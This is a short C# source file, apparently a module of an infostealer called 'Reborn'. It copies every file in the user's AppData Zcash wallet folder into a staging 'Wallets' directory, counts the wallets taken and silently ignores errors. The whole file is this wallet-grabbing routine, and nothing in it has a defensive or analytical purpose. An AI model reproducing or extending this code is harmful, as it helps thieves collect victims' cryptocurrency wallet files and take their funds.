﻿using System.IO;

namespace Reborn
{
    class Zcash
    {
        public static int count = 0;
        public static string ZcashDir = "\\Wallets\\Zcash\\";
        public static void ZecwalletStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Zcash\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ZcashDir);
                    file.CopyTo(directorypath + ZcashDir + file.Name);
                }
                Counting.Wallets++;
            }
            catch { return; }

        }
    }
}
